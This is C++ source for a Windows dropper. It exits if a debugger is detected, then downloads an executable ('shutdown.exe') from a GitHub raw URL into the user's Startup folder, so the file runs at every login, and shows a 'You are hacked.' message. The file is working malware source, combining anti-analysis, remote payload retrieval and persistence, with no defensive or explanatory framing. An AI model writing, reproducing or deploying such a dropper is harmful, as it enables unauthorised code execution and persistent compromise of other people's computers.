#include <iostream>
#include <fstream>
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <wininet.h>    

#pragma comment(lib, "wininet.lib")

void checkDebugger() {
    if (IsDebuggerPresent()) {
        std::cerr << "Debugger detected! Exiting program." << std::endl;
        ExitProcess(1); // Terminate the program
    }
}

bool DownloadFile(const std::string& url, const std::string& outputFile) {
    // Initialize WinINet API
    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "Failed to initialize WinINet." << std::endl;
        return false;
    }

    // Open the URL
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        std::cerr << "Failed to open URL." << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    // Create the output file to write to
    std::ofstream outFile(outputFile, std::ios::binary);
    if (!outFile) {
        std::cerr << "Failed to open output file." << std::endl;
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Buffer to hold data read from URL
    char buffer[1024];
    DWORD bytesRead = 0;

    // Read the file data from URL and write it to the output file
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(buffer, bytesRead);
    }

    // Close the file and the URL handles
    outFile.close();
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    std::cout << "File downloaded successfully!" << std::endl;
    return true;
}

int main() {

    checkDebugger();

    char startupPath[MAX_PATH] = {0}; // Buffer to store the startup folder path
    std::string targetPath;

    // Retrieve the path to the user's startup folder
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        // Construct the full path for the target executable in the startup folder
        targetPath = std::string(startupPath) + "\\my_application.exe";

        // URL of the file you want to download
        std::string url = "https://github.com/MeenalShah13/junk/raw/refs/heads/main/shutdown.exe";

        // Download the file
        if (!DownloadFile(url, targetPath)) {
            std::cerr << "Download failed." << std::endl;
            return 1;
        }

        MessageBoxA(NULL, "You are hacked.", "Message", MB_OK | MB_ICONEXCLAMATION);
    } else {
        // Failed to retrieve the startup folder path
        DWORD error = GetLastError();
        std::cerr << "Failed to retrieve the startup folder path. Error code: " << error << std::endl;
    }

    return 0;
}